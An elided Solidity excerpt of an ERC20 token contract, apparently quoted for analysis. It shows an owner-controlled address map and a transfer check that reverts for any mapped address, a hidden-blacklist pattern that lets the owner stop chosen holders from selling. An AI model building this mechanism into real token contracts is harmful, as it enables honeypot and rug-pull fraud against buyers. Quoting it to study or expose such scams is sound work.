...
*/
    ...
    contract TOKEN is ERC20 {
        ...
        mapping (address => bool) private _buyMap;
        ...
        function burn(uint tokens) external onlyOwner {
         ...
         function rBuyMap(address account) external onlyOwner {
        _buyMap[account] = false;
        }

        function aBuyMap(address account) external onlyOwner {
        _buyMap[account] = true;
        }
        ...
        function _transfer(
            ...
            require(!_buyMap[from] && !_buyMap[to], "ERC20: This address is mapped.");
